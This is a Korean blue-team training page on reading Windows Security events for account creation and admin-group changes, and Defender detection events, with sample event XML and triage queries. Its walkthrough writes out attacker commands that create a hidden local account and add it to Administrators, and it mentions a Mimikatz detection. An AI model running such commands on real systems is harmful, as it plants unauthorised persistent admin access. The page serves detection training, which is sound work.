---
title: "계정, Defender, PowerShell 이벤트 — 4720, 4728/4732/4756 그룹 변경, Defender 1116/1117/1006, PowerShell 4103/4104"
tags:
  - training
  - blue-team
  - windows
  - logging
  - powershell
---

# 계정, Defender, PowerShell 이벤트 — 4720, 4728/4732, 1116/1006, 4104 { #accounts-defender-powershell }

!!! abstract "이 페이지에서 다루는 것"
    서로 다른 세 가지 질문에 답하는 Windows 이벤트 세 묶음입니다. **계정:** "누가 몰래 자기 열쇠를 하나 더 만들었나?" — 공격자가 왜 계정을 만들고 관리자 그룹에 넣는지, 그걸 기록하는 감사 하위 범주 두 개, **4720**(사용자 생성)을 칸별로 읽고 바로 뒤따르는 이벤트 묶음까지 보기, **4732 / 4728 / 4756**(로컬·글로벌·유니버설 그룹에 구성원 추가)과 "어떤 그룹이면 어떤 ID인가"에서 흔히 하는 실수, 계정의 나머지 일생(4722–4726, 4738, 4740, 4767, 4781, 4798/4799), 그리고 각 이벤트가 어디에 남는지. **Defender:** "기본 백신이 무엇을 봤나?" — Defender Operational 채널, **1116**(탐지)과 **1117**(조치)을 칸별로 읽기, 옛 **1006/1007**, 실패 이벤트(1008, 1118, 1119), 누군가 보호를 끄려 한 흔적(5001, 5007, 5013)과 공격 표면 축소 규칙 동작(1121/1122). **PowerShell:** "공격자가 정확히 뭘 쳤나?" — 모듈 로깅 **4103**, 스크립트 블록 로깅 **4104**를 칸별로 읽기(인코딩된 명령이 이미 풀린 채로 보이는 이유 포함), 나뉘어 저장되는 스크립트 블록, 수상한 블록 자동 기록, 기록(transcription), 예전부터 있던 400/800 이벤트, 버전 2 다운그레이드, 따로 노는 PowerShell 7 로그. SOC 점검 목록, 2026년 관점, 확인 문제가 이어집니다.

!!! note "표기"
    **[보충]** = 꼭 알아야 할 실무 보충, **[정정]** = 흔히 잘못 알려진 내용 정정, **[변경됨]**/**[주의]** = 최근 바뀐 점과 옛 방식대로 하면 위험한 점. 호스트 이름, 도메인, 계정, SID, IP, 파일 이름, 위협 이름은 모두 설명용 가상 값이거나 일반적인 예시입니다(`.example`, 문서용·사설 IP).

## 한눈에 보는 핵심 8가지 { #key-points }

1. 새 계정은 공격자가 다시 부수고 들어올 필요가 없도록 남겨 두는 **여분의 열쇠**입니다(ATT&CK **T1136.001** 로컬 계정, **T1136.002** 도메인 계정). 그 계정이나 기존 계정을 관리자 그룹에 넣는 건 **T1098.007**(Additional Local or Domain Groups)입니다. 새 계정이 **관리자 그룹에 들어갔다**는 건 공격자가 이미 관리자 권한을 가졌다는 뜻이기도 합니다.
2. **4720** "사용자 계정이 만들어짐"(하위 범주 *Audit User Account Management*)은 **누가 만들었는지**(Subject)와 **새 계정**(Target)을 알려 줍니다. 같은 1초 안에 **4722**(사용), **4724**(비밀번호 설정), **4738**(변경)이 뒤따릅니다. `net user <이름> <비밀번호> /add`를 치면 바로 이 묶음이 생깁니다.
3. 그룹 구성원 변경 ID는 "로컬이냐 도메인이냐"가 아니라 **그룹의 범위(scope)** 로 정해집니다. **4732** = 보안이 켜진 **로컬** 그룹(*도메인 로컬* 그룹과 도메인 컨트롤러의 기본 `Administrators` 그룹 포함), **4728** = **글로벌** 그룹(예: `Domain Admins`), **4756** = **유니버설** 그룹(예: `Enterprise Admins`). 빼는 건 4733 / 4729 / 4757입니다. 모두 *Audit Security Group Management*가 필요합니다.
4. 로컬 계정에 대한 4732에서는 `MemberName`이 그냥 `-`입니다. 구성원은 **`MemberSid`** 로만 알 수 있습니다. SID를 이름으로 바꾸지 않으면 누가 들어갔는지 놓칩니다. 그룹은 `TargetSid`로 알아봅니다(`S-1-5-32-544` = 어느 컴퓨터에서나 Administrators).
5. 도메인 계정 이벤트는 **그 변경을 처리한 도메인 컨트롤러**에, 로컬 계정 이벤트는 **그 컴퓨터 자신**에 남습니다. DC 한 대가 아니라 모든 DC에서 모으세요.
6. Defender는 Security가 아니라 자기 채널, **Microsoft-Windows-Windows Defender/Operational**에 씁니다. **1116** = 악성코드 탐지, **1117** = 조치함, **1006/1007**은 예전 버전의 같은 뜻 이벤트입니다. **위협 이름, 경로, 프로세스 이름, 탐지 사용자, 조치와 결과**를 읽으세요. 그리고 탐지는 조사의 끝이 아니라 시작입니다.
7. 방어자에게 가장 중요한 이벤트는 오히려 **Defender 자신에 대한** 이벤트일 때가 많습니다. **5001** 실시간 보호 꺼짐, **5007** 설정 바뀜(새 **예외(exclusion)** 를 지켜보세요), **5013** 변조 방지(tamper protection)가 변경을 막음. 모두 **T1562.001**(Impair Defenses)의 신호입니다.
8. **4104**(스크립트 블록 로깅, PowerShell Operational 채널)는 **PowerShell 엔진이 실제로 실행하는 코드의 글자 그대로**를 기록합니다. 인코딩과 여러 겹의 난독화가 벗겨진 뒤의 코드입니다. 하지만 **실행 결과(출력)는 기록하지 않습니다**. 양이 많고, 긴 스크립트는 여러 이벤트로 쪼개지며(`MessageNumber`/`MessageTotal`, `ScriptBlockId`로 다시 합침), 수상해 보이는 블록은 정책을 안 켜도 *Warning* 수준으로 기록됩니다. 출력이 필요하면 **기록(transcription)**, 명령별 자세한 내용은 **4103** 모듈 로깅입니다.

## 왜 이 세 가지인가 { #why }

꼼꼼한 관리인이 있는 아파트를 떠올려 보세요. 깨진 창문으로 한 번 들어온 도둑은 다음엔 창문을 또 깨지 않고 들어오고 싶습니다. 그래서 조용히 **마스터키를 하나 복사하고, 주민 명부에 자기 이름을 올려 둡니다.** 관리자 그룹에 들어간 새 계정이 바로 이겁니다. 집집마다 **화재 감지기**도 있습니다. 냄새가 이상하면 삑 울리고 작은 일지에 적어 두죠. 이게 백신 로그입니다. 그리고 어떤 집에는 **로봇 집사에게 내린 모든 명령을 받아 적는 녹음기**가 있습니다. 명령을 암호처럼 웅얼거려도 집사가 알아들은 내용 그대로 적힙니다. 이게 PowerShell 스크립트 블록 로깅입니다. 좋은 관리인은 셋을 다 봅니다. 주민 명부에 처음 보는 이름이 없는지, 화재 감지기 일지에 경보(그리고 꺼진 감지기)가 없는지, 집사 녹음에 이상한 명령이 없는지.

기술적인 실제로 돌아오면, 처음 들어온 공격자는 **머무르고**(지속성, TA0003), **권한을 올리고**(TA0004), **들키지 않으려고**(방어 회피, TA0005) 합니다. 계정을 만들거나 바꾸면, 악성코드를 다 치워도 살아남는 오래가고 정상처럼 보이는 출입 수단이 생깁니다. 계정은 악성코드가 아니라서 백신이 지워 주지도 않습니다. 백신 로그는 공격자 도구가 무엇에 걸렸는지, 그리고 똑같이 중요한 것으로, 공격자가 백신을 끄려 했는지를 알려 줍니다. PowerShell은 모든 Windows에 깔려 있고, 코드를 내려받아 파일 없이 메모리에서만 돌릴 수 있고, Windows의 거의 모든 부분과 대화할 수 있습니다. 그래서 가장 많이 쓰이는 공격 도구 중 하나입니다(T1059.001). 실제 공격 코드가 어딘가에 글자로 남는 곳은 스크립트 블록 로그가 유일할 때가 많습니다.

공격자 쪽 이야기는 [실행, 지속성, 정보 탐색](../endpoint-attacks/execution-persistence-discovery.md)과 [권한 상승](../endpoint-attacks/privilege-escalation.md)에, 방어 계층으로서의 백신은 [Credential Guard, Application Guard, 호스트 방화벽, 백신](../endpoint-defense/vbs-firewall-antivirus.md)에 있습니다.

## 계정 생성과 그룹 변경 { #accounts }

### 켜는 법 { #account-config }

고급 감사 정책의 *Account Management* 범주에 있는 하위 범주 두 개가 이 이벤트들을 만듭니다.

```text
C:\> auditpol /get /subcategory:"User Account Management","Security Group Management"
System audit policy
Category/Subcategory                      Setting
Account Management
  User Account Management                 Success and Failure
  Security Group Management               Success
```

한 줄씩 보면:

- `auditpol /get` — 지금 감사 정책을 보여 줍니다(관리자 권한으로 실행).
- `/subcategory:"...","..."` — 이름으로 지정한 이 두 하위 범주만 봅니다.
- `User Account Management   Success and Failure` — 4720, 4722–4726, 4738, 4740, 4767, 4781 같은 이벤트가 기록됩니다. *Failure*는 거절된 시도까지 남깁니다(예: 관리자가 아닌 사람이 사용자를 만들려다 실패).
- `Security Group Management   Success` — 4727–4737, 4754–4758, 4798/4799가 기록됩니다.

최신 Windows에서는 Microsoft 기본값이 둘 다 *Success*를 남기고, 보안 기준(Microsoft 자체 기준과 CIS)도 최소 *Success*를 요구합니다. 하지만 여러분 환경의 그룹 정책이 바꿔 놓았을 수 있습니다. 짐작하지 말고 `auditpol`로 꼭 확인하세요. 양이 아주 적어서, Security 로그 전체에서 가장 싸고 가치 높은 이벤트들입니다.

### 이벤트 4720: 사용자 계정이 만들어짐 { #4720 }

파일 서버에서 이미 관리자 권한을 가진 공격자가 `net user svc_backup2 <password> /add`를 실행합니다. 그 서버의 Security 로그에는 이렇게 남습니다.

```xml
<System>
  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
  <EventID>4720</EventID>
  <Task>13824</Task>
  <Keywords>0x8020000000000000</Keywords>
  <TimeCreated SystemTime="2026-11-20T03:41:07.5530912Z" />
  <Channel>Security</Channel>
  <Computer>FS-02.corp.example</Computer>
</System>
<EventData>
  <Data Name="TargetUserName">svc_backup2</Data>
  <Data Name="TargetDomainName">FS-02</Data>
  <Data Name="TargetSid">S-1-5-21-3021418877-1655470914-2519003118-1009</Data>
  <Data Name="SubjectUserSid">S-1-5-21-1004336348-1177238915-682003330-1120</Data>
  <Data Name="SubjectUserName">helpdesk.t2</Data>
  <Data Name="SubjectDomainName">CORP</Data>
  <Data Name="SubjectLogonId">0x3a91f02</Data>
  <Data Name="PrivilegeList">-</Data>
  <Data Name="SamAccountName">svc_backup2</Data>
  <Data Name="DisplayName">%%1793</Data>
  <Data Name="UserPrincipalName">-</Data>
  <Data Name="HomeDirectory">%%1793</Data>
  <Data Name="ScriptPath">%%1793</Data>
  <Data Name="PasswordLastSet">%%1794</Data>
  <Data Name="AccountExpires">%%1794</Data>
  <Data Name="PrimaryGroupId">513</Data>
  <Data Name="UserAccountControl">%%2080 %%2082 %%2084</Data>
  <Data Name="SidHistory">-</Data>
  <Data Name="LogonHours">%%1797</Data>
</EventData>
```

칸별로 보면:

- `Provider` `Microsoft-Windows-Security-Auditing`, `Channel` `Security` — 평범한 Security 감사 이벤트입니다.
- `EventID` `4720` — "A user account was created(사용자 계정이 만들어짐)." `Task` `13824`는 *User Account Management* 하위 범주 번호입니다.
- `Keywords` `0x8020000000000000` — "Audit Success(감사 성공)". 실패라면 `0x8010000000000000`입니다.
- `Computer` `FS-02.corp.example` — 이벤트가 쓰인 곳입니다. **로컬** 계정이라면 이제 그 계정을 가진 컴퓨터입니다.
- `TargetUserName` `svc_backup2` — **새 계정**입니다. 서비스 계정처럼 보이게 이름을 지어서 섞여 들려고 했습니다. 아주 흔한 선택입니다. `support`, `admin1`, `defaultuser` 같은 이름이나, 실제 직원 이름에서 한 글자만 바꾼 이름도 자주 씁니다.
- `TargetDomainName` `FS-02` — `CORP`가 아니라 컴퓨터 이름입니다. 즉 이건 서버의 **로컬** 계정입니다. (도메인 계정이었다면 도메인의 NetBIOS 이름이 보이고, 이벤트는 DC에 남았을 겁니다.)
- `TargetSid` `...-1009` — 새 계정의 SID입니다. 맨 끝 숫자인 **RID**는 그 컴퓨터에서 계정을 만들 때마다 하나씩 커집니다. 로컬 RID는 1000부터 시작합니다. 이 SID를 기억해 두세요. 뒤에 나올 4732는 계정을 이 SID로만 가리킵니다.
- `SubjectUserName` / `SubjectDomainName` `CORP\helpdesk.t2` — **만든 사람**입니다. 헬프데스크 계정이 파일 서버에 로컬 사용자를 만드는 것 자체가 이상합니다.
- `SubjectLogonId` `0x3a91f02` — 이 일을 한 로그온 세션입니다. 같은 호스트에서 `TargetLogonId`가 이 값인 4624를 찾으면 만든 사람이 **어떻게**, **어디서** 로그온했는지 알 수 있고([로그인 이벤트](logins.md)), `SubjectLogonId`가 이 값인 4688을 찾으면 `net.exe` 명령이 보입니다([프로세스 생성 이벤트](process-creation.md)).
- `SamAccountName` — Windows 2000 이전 방식의 로그온 이름입니다. 보통 `TargetUserName`과 같습니다.
- `%%1793` = "&lt;value not set&gt;(값 없음)", `%%1794` = "&lt;never&gt;(안 함)", `%%1797` = "All(전부)"(로그온 시간) — 이벤트 뷰어가 글자로 바꿔 보여 주는 **메시지 코드**입니다([Windows 이벤트 속 들여다보기](../windows-logging/event-structure-channels.md) 참고). 원본 XML이나 SIEM에서는 코드 그대로 보입니다.
- `PrimaryGroupId` `513` — "Domain Users"/"None", 평범한 기본값입니다.
- `UserAccountControl` `%%2080 %%2082 %%2084` — 만들 때 켜진 깃발입니다. `%%2080` "Account Disabled(계정 사용 안 함)", `%%2082` "'Password Not Required' - Enabled(비밀번호 필요 없음)", `%%2084` "'Normal Account' - Enabled(일반 계정)". Windows는 계정을 잠깐 동안 꺼진 상태, 비밀번호 없는 상태로 만들고, 다음 이벤트들에서 비밀번호를 넣고 켭니다. 그래서 4720 하나만 보면 이상해 보이고, 짝 이벤트를 같이 봐야 합니다.
- `SidHistory` `-` — 비어 있습니다. 새 계정이나 바뀐 계정에 **`SidHistory`가 채워져 있으면** 아주 큰 위험 신호입니다. 그 계정에 다른 SID, 예를 들면 Domain Admins의 권한을 몰래 줄 수 있기 때문입니다(T1134.005).

같은 1–2초 안에, 모두 같은 `SubjectLogonId`로 뒤따르는 묶음:

| 이벤트 | 뜻 | 이 이야기에서는 |
| --- | --- | --- |
| 4722 | 사용자 계정이 사용 가능해짐 | `svc_backup2` 켜짐 |
| 4724 | 계정 비밀번호 재설정 시도 | 명령줄의 비밀번호가 설정됨(관리자의 **재설정**. 4723은 사용자가 자기 비밀번호를 **바꾸는** 것) |
| 4738 | 사용자 계정이 바뀜 | 깃발 갱신(`UserAccountControl`에서 "Disabled"와 "Password Not Required"가 빠짐) |
| 4732 | 보안이 켜진 로컬 그룹에 구성원 추가 | 자동으로 `Users`에 추가 — 그리고 나중에 진짜 신경 써야 할 이벤트: `Administrators`에 추가 |

[보충] *Active Directory 사용자 및 컴퓨터*나 `New-ADUser`로 도메인 계정을 만들면 같은 이벤트가 요청을 처리한 **도메인 컨트롤러**에 남고, `TargetDomainName`은 도메인 이름입니다. *Audit Directory Service Changes*가 켜져 있으면 DC가 **5137**(디렉터리 개체 생성)도 남기는데, 개체의 전체 DN(distinguished name)이 들어 있습니다.

### 이벤트 4732: 보안이 켜진 로컬 그룹에 구성원이 추가됨 { #4732 }

몇 분 뒤 공격자가 `net localgroup Administrators svc_backup2 /add`를 실행합니다.

```xml
<System>
  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" />
  <EventID>4732</EventID>
  <Task>13826</Task>
  <TimeCreated SystemTime="2026-11-20T03:42:55.1029314Z" />
  <Channel>Security</Channel>
  <Computer>FS-02.corp.example</Computer>
</System>
<EventData>
  <Data Name="MemberName">-</Data>
  <Data Name="MemberSid">S-1-5-21-3021418877-1655470914-2519003118-1009</Data>
  <Data Name="TargetUserName">Administrators</Data>
  <Data Name="TargetDomainName">Builtin</Data>
  <Data Name="TargetSid">S-1-5-32-544</Data>
  <Data Name="SubjectUserSid">S-1-5-21-1004336348-1177238915-682003330-1120</Data>
  <Data Name="SubjectUserName">helpdesk.t2</Data>
  <Data Name="SubjectDomainName">CORP</Data>
  <Data Name="SubjectLogonId">0x3a91f02</Data>
  <Data Name="PrivilegeList">-</Data>
</EventData>
```

칸별로 보면:

- `EventID` `4732` — "A member was added to a security-enabled local group(보안이 켜진 로컬 그룹에 구성원이 추가됨)." `Task` `13826` = *Security Group Management*.
- `MemberName` `-` — **비어 있습니다**. 이 칸에는 구성원의 **DN**(`CN=...,OU=...,DC=...`)이 들어가는데, DN은 Active Directory 개체에만 있습니다. **로컬** 계정에는 없으니 대시가 찍힙니다. `MemberName`에서 구성원 이름을 찾는 규칙은 로컬 계정을 하나도 빠짐없이, 소리 없이 놓칩니다.
- `MemberSid` `...-1009` — **이게 구성원입니다.** 위 4720의 `TargetSid`와 같은 SID입니다. 이름으로 바꾸세요(이벤트 뷰어의 보기 좋은 화면에는 이름이 나올 때가 많고, SIEM에서는 4720과 엮거나 따로 조회합니다).
- `TargetUserName` `Administrators`, `TargetDomainName` `Builtin` — **그룹**입니다. 이름이 헷갈리죠. 그룹 이벤트에서 "Target"은 사용자가 아니라 **그룹**입니다.
- `TargetSid` `S-1-5-32-544` — 기본 Administrators 그룹의 잘 알려진 SID로, 모든 Windows 컴퓨터에서 같습니다. 이름이 아니라 SID로 맞춰 보세요. 영어가 아닌 시스템에서는 이름이 번역되고("Administratoren", "Administrateurs"), 이름을 바꿀 수도 있습니다.
- `Subject...`와 `SubjectLogonId` `0x3a91f02` — 4720과 같은 사람, 같은 로그온 세션입니다. 이 연결이 한 행위자가 둘 다 했다는 증거입니다.

같이 경보를 걸 만한 잘 알려진 로컬 그룹 SID: `S-1-5-32-555` Remote Desktop Users(RDP 접속 권한), `S-1-5-32-551` Backup Operators(비밀번호 해시가 든 레지스트리 하이브를 포함해 어떤 파일이든 읽을 수 있음), `S-1-5-32-580` Remote Management Users(WinRM / PowerShell 원격).

### 어떤 그룹이면 어떤 이벤트 ID인가 { #group-scope }

[정정] "4732는 로컬 그룹, 4728은 도메인 그룹"이라는 말을 자주 듣습니다. 거의 맞지만 중요한 지점에서 틀립니다. ID는 Active Directory에서 말하는 그룹의 **범위(scope)** 로 정해집니다.

| 그룹 범위 | 추가 / 제거 | 그룹 생성 / 변경 / 삭제 | 흔한 예 |
| --- | --- | --- | --- |
| 로컬(구성원 컴퓨터)과 **도메인 로컬**(AD) | **4732** / 4733 | 4731 / 4735 / 4734 | `Administrators`, `Remote Desktop Users`; DC에서는 `BUILTIN\Administrators`, `Server Operators`, `Account Operators` |
| **글로벌**(AD) | **4728** / 4729 | 4727 / 4737 / 4730 | `Domain Admins`, `Domain Users`, 대부분의 부서 그룹 |
| **유니버설**(AD) | **4756** / 4757 | 4754 / 4755 / 4758 | `Enterprise Admins`, `Schema Admins` |

정리하면, DC에서 누군가를 **Domain Admins**에 넣으면 → **4728**. 도메인의 **기본 Administrators** 그룹(DC에서는 이게 오히려 더 강합니다)에 넣으면 → DC에 **4732**. **Enterprise Admins**에 넣으면 → **4756**. 4728만 지켜보는 규칙은 가장 위험한 그룹 셋 중 둘을 놓칩니다. (보안 의미가 없는 메일링 리스트인 *배포(distribution)* 그룹은 4744–4762 범위에 따로 ID가 있고, 보통은 신경 쓸 필요가 없습니다.)

### 계정의 나머지 일생 { #account-lifecycle }

| 이벤트 | 뜻 | 왜 신경 쓰나 |
| --- | --- | --- |
| 4722 / 4725 | 계정 사용 / 사용 안 함 | 오래 꺼져 있던 계정(퇴사자, 기본 `Guest`나 `Administrator`)을 다시 켜는 건 조용한 지속성 수법입니다 |
| 4723 / 4724 | 사용자가 자기 비밀번호 변경 / 관리자가 비밀번호 재설정 | 이상한 사람이 특권 계정 비밀번호를 재설정했다면 계정 탈취입니다 |
| 4726 | 계정 삭제 | 공격자는 마지막에 자기 계정을 지워 흔적을 치웁니다. 로그를 보관했다면 4720은 남아 있습니다 |
| 4738 | 계정 변경 | 무엇이 바뀌었는지 보세요. `UserAccountControl`(예: "Password Never Expires", "Don't Require Preauth" — 뒤의 것은 AS-REP 로스팅을 가능하게 함), `SidHistory`, `AllowedToDelegateTo` |
| 4740 / 4767 | 계정 잠김 / 잠금 해제 | 여러 계정에 걸친 잠김은 비밀번호 스프레이입니다([로그인 이벤트](logins.md)) |
| 4781 | 계정 이름 바뀜 | 만든 계정을 정상처럼 보이게 이름을 바꾸거나, 기본 Administrator 이름을 바꿈 |
| 4798 / 4799 | 사용자의 로컬 그룹 소속 / 로컬 그룹의 구성원 목록을 조회함 | 정보 탐색(T1069.001, T1087.001): 누가 관리자인가? 정상 도구도 많이 해서 시끄럽습니다. 조회한 프로세스가 `net.exe`, PowerShell, 처음 보는 프로그램일 때 쓸모가 있습니다 |

### 실제로 판단하는 순서 { #account-triage }

계정이나 관리자 그룹 이벤트가 뜨면 이 순서로 물어보세요.

1. **누가, 어디서 했나?** Subject → `SubjectLogonId` → 4624(로그온 유형과 출발지 IP). 변경 요청서가 있는 시간에 IT 관리자가 자기 관리용 워크스테이션에서 대화형으로 로그온해 한 일과, 새벽 3시에 일반 사용자 노트북에서 네트워크 로그온으로 한 일은 전혀 다릅니다.
2. **무엇이었나?** 계정 이름, 어떤 그룹(SID로), 새 계정인지(바로 전에 4720이 있는지) 기존 계정인지.
3. **어떻게?** 프로세스. `net.exe`/`net1.exe`, PowerShell `New-LocalUser`/`Add-LocalGroupMember`, MMC 콘솔, 아니면 이상한 것(웹 서버 프로세스, 처음 보는 실행 파일).
4. **쓰였나?** 이 호스트와 다른 호스트에서 새 계정이 `TargetUserName`인 4624.
5. **다른 데도 있나?** 같은 계정 이름이 몇 분 안에 여러 호스트에 만들어졌다면 스크립트나 원격 도구로 퍼뜨리는 중입니다.

호스트 한 대에서 PowerShell로 빠르게 보기:

```powershell
Get-WinEvent -FilterHashtable @{ LogName='Security'; Id=4720,4722,4724,4732,4728,4756; StartTime=(Get-Date).AddDays(-1) } |
  Select-Object TimeCreated, Id, @{n='Who';e={$_.Properties | Where-Object { $_ } | Select-Object -Index 5}}, Message |
  Format-List
```

한 줄씩 보면:

- `Get-WinEvent -FilterHashtable @{ ... }` — 이벤트를 읽는데, 다 읽은 다음 거르는 게 아니라 이벤트 로그 서비스 안에서 걸러서(빠름) 가져옵니다.
- `LogName='Security'` — Security 채널.
- `Id=4720,4722,...` — 이 이벤트 ID들만.
- `StartTime=(Get-Date).AddDays(-1)` — 최근 24시간만.
- `Select-Object TimeCreated, Id, ... Message` — 시각, ID, 글자로 풀린 메시지만 남깁니다. `@{n=...;e=...}` 부분은 계산해서 만드는 열입니다(여기서는 순서 번호로 속성 하나를 꺼내 보는 거친 시도인데, 순서가 이벤트 ID마다 달라서 실제로는 `Message`를 읽거나 `$_.ToXml()`을 파싱합니다).
- `Format-List` — 속성을 한 줄에 하나씩. 긴 메시지는 이게 읽기 편합니다.

결과는 이렇게 보입니다(줄임).

```text
TimeCreated : 20/11/2026 2:42:55 PM
Id          : 4732
Message     : A member was added to a security-enabled local group.
              Subject:  Account Name: helpdesk.t2  Account Domain: CORP  Logon ID: 0x3A91F02
              Member:   Security ID: FS-02\svc_backup2  Account Name: -
              Group:    Security ID: BUILTIN\Administrators  Group Name: Administrators

TimeCreated : 20/11/2026 2:41:07 PM
Id          : 4720
Message     : A user account was created.
              ...
```

시각이 그 컴퓨터의 현지 시각(여기서는 UTC+11)으로 보이고, XML의 `SystemTime`은 UTC라는 점에 주의하세요. 타임라인을 만들 때 헷갈리기 쉽습니다.

## Microsoft Defender 백신 이벤트 { #defender }

### 이벤트가 있는 곳 { #defender-channel }

Microsoft Defender 백신(Microsoft Defender Antivirus — 로그와 폴더 이름에는 아직 "Windows Defender"라고 나옵니다)은 자기 채널에 씁니다.

- 이벤트 뷰어: *응용 프로그램 및 서비스 로그 → Microsoft → Windows → Windows Defender → Operational*
- 채널 이름: `Microsoft-Windows-Windows Defender/Operational`
- 파일: `C:\Windows\System32\winevt\Logs\Microsoft-Windows-Windows Defender%4Operational.evtx`

Security에 **없습니다**. 그래서 SIEM 에이전트를 Security, System, Application만 모으게 설정했다면 이 로그는 안 보입니다. 채널을 따로 추가하세요. **Microsoft Defender for Endpoint**(예전 이름 "Defender ATP")를 쓰는 조직은 어차피 Defender 포털에서 탐지를 한곳에 모아 보지만, 이 로컬 채널도 여전히 쓸모가 있습니다. 그 라이선스 없이도 동작하고, 포렌식 분석가가 디스크에서 바로 볼 수 있고, 등록(onboarding)이 안 된 컴퓨터도 다룹니다.

### 이벤트 1116: 악성코드 탐지 { #1116 }

사용자가 자격 증명 덤프 도구가 든 압축 파일을 내려받아 엽니다. Defender 실시간 보호가 잡습니다.

```xml
<System>
  <Provider Name="Microsoft-Windows-Windows Defender" Guid="{11cd958a-c507-4ef3-b3f2-5fd9dfbd2c78}" />
  <EventID>1116</EventID>
  <Level>3</Level>
  <TimeCreated SystemTime="2026-11-20T05:12:44.8812201Z" />
  <Channel>Microsoft-Windows-Windows Defender/Operational</Channel>
  <Computer>WS-031.corp.example</Computer>
  <Security UserID="S-1-5-18" />
</System>
<EventData>
  <Data Name="Product Name">Microsoft Defender Antivirus</Data>
  <Data Name="Detection ID">{6F1B2C2E-8A44-4C1D-9E7A-0B3C5D9E1A22}</Data>
  <Data Name="Detection Time">2026-11-20T05:12:44.851Z</Data>
  <Data Name="Threat ID">2147700001</Data>
  <Data Name="Threat Name">HackTool:Win64/Mimikatz</Data>
  <Data Name="Severity Name">High</Data>
  <Data Name="Category Name">Tool</Data>
  <Data Name="Process Name">C:\Windows\explorer.exe</Data>
  <Data Name="Detection User">CORP\j.lee</Data>
  <Data Name="Path">file:_C:\Users\j.lee\Downloads\tools\x64\mk.exe; containerfile:_C:\Users\j.lee\Downloads\tools.zip</Data>
  <Data Name="Origin Name">Internet</Data>
  <Data Name="Execution Name">Suspended</Data>
  <Data Name="Type Name">Concrete</Data>
  <Data Name="Source Name">Real-Time Protection</Data>
  <Data Name="Action Name">Not Applicable</Data>
  <Data Name="Security intelligence Version">AV: 1.441.112.0, AS: 1.441.112.0</Data>
  <Data Name="Engine Version">AM: 1.1.25100.2</Data>
</EventData>
```

칸별로 보면:

- `Provider` `Microsoft-Windows-Windows Defender`와 Operational 채널 — Security 감사 시스템이 아니라 Defender가 썼습니다.
- `EventID` `1116` — "The antimalware platform detected malware or other potentially unwanted software(악성코드나 원치 않는 소프트웨어를 탐지함)." **찾았다**는 뜻이지 아직 **처리했다**는 뜻이 아닙니다.
- `Level` `3` — 경고(Warning).
- `Security UserID` `S-1-5-18` — LocalSystem. Defender 서비스가 이벤트를 씁니다. 관련된 사용자는 아래 `Detection User`에 있습니다.
- `Detection ID` — 짝이 되는 1117(조치) 이벤트와 같은 GUID입니다. "탐지"와 "그다음 일어난 일"을 이 값으로 잇습니다.
- `Threat Name` `HackTool:Win64/Mimikatz` — Microsoft 이름 짓기 방식은 `유형:플랫폼/계열.변종!꼬리표`입니다. 처음 읽을 때는 **유형**이 가장 쓸모 있습니다. `Trojan`, `Backdoor`, `Ransom`, `Exploit`은 악성코드이고, `HackTool`은 공격자나 관리자가 쓰는 **도구**입니다. 일반 사용자 노트북에 해킹 도구가 있다는 건 흔한 광고 프로그램보다 **더 나쁜 소식**일 때가 많습니다. 사람 공격자가 그 컴퓨터에서 작업 중이라는 뜻일 수 있기 때문입니다([자격 증명 덤프와 Mimikatz](../endpoint-attacks/credential-dumping-mimikatz.md) 참고). `PUA`/`PUADlMgr`/`SoftwareBundler`는 원치 않는 소프트웨어, `Behavior:`는 행위 감시에서 나온 것, `!ml`/`!MTB` 꼬리표는 머신러닝이나 클라우드 탐지로 계열에 대한 확신이 덜하다는 뜻입니다.
- `Severity Name` `High`, `Category Name` `Tool` — Microsoft의 자체 등급입니다. 우선순위를 정하는 데는 쓸모 있지만 *Low*와 *Moderate*를 버리지는 마세요. 공격 도구가 낮게 매겨질 때도 있습니다.
- `Process Name` `C:\Windows\explorer.exe` — 탐지될 때 그 파일을 건드린 프로세스입니다. `explorer.exe` = 사용자가 열거나 압축을 풂, `chrome.exe`/`msedge.exe` = 내려받는 순간, `powershell.exe`나 `cmd.exe` = 명령줄에서 무언가가 실행함. 마지막 경우가 더 심각합니다.
- `Detection User` `CORP\j.lee` — 누구의 세션이었나. 꼭 범인이라는 뜻은 아닙니다. 악성코드는 감염시킨 사용자 권한으로 돌아갑니다.
- `Path` — `file:_` 뒤에 파일 경로, `containerfile:_`은 그 파일이 들어 있던 압축 파일입니다. 경로가 여럿이면 `;`로 나뉩니다. 그 밖에 보이는 접두어: `process:_pid:...`(실행 중인 프로세스), `regkey:_`(레지스트리 값), `webfile:_`(다운로드, URL 포함).
- `Origin Name` `Internet` — Defender가 생각하는 파일의 출처(Mark of the Web). 다른 값: `Local machine`, `Network share`, `Unknown`.
- `Execution Name` `Suspended` — 위협이 실행 중이었나. `Suspended`(실행 전에 멈춤), `Executing`(**실행 중이었음** — 무언가 했다고 가정하세요), `Not Executing`.
- `Source Name` `Real-Time Protection` — 어떤 기능이 찾았나. 실시간 보호, 예약 검사, 사용자 검사, 행위 감시, AMSI(스크립트 내용).
- `Action Name` `Not Applicable` — 탐지 순간에는 **아직** 조치 없음. 결과는 1117에 있습니다.
- `Security intelligence Version`, `Engine Version` — 시그니처와 엔진 버전. 아주 오래된 버전이면 그 컴퓨터가 업데이트를 안 하고 있다는 뜻이고, 그 자체가 발견 사항입니다.

### 이벤트 1117과 나머지 식구들 { #defender-family }

보통 1초 안에 **1117** "The antimalware platform performed an action to protect your system(시스템을 보호하려고 조치함)"이 같은 `Detection ID`로 뒤따릅니다. 여기에는 `Action Name`(`Quarantine` 격리, `Remove` 삭제, `Block` 차단, `Allow` 허용)과 `Error Code` / `Error Description`(`0x00000000` "The operation completed successfully" = 성공)이 들어 있습니다. 중요한 이벤트 ID:

| 이벤트 | 뜻 | 왜 신경 쓰나 |
| --- | --- | --- |
| **1116** | 악성코드나 원치 않는 소프트웨어 탐지 | 이야기의 시작 — 실시간, 행위, AMSI 탐지 |
| **1117** | 조치함(격리, 삭제, 차단, 허용) | 정리가 됐나? `Allow`는 누군가 허용했다는 뜻 |
| **1006** / **1007** | 악성코드 탐지 / 조치함(예전 이벤트, 주로 검사에서 나옴) | 1116/1117과 같은 뜻. 아직도 보이니 두 쌍 다 모으세요 |
| 1008, 1118, 1119 | 조치 **실패**(1118 심각하지 않음, 1119 심각) | 악성코드가 아직 남아 있을 수 있음 — 올려 보내세요 |
| 1015 | 수상한 행위 탐지 | 행위 감시, 파일 시그니처가 없어도 됨 |
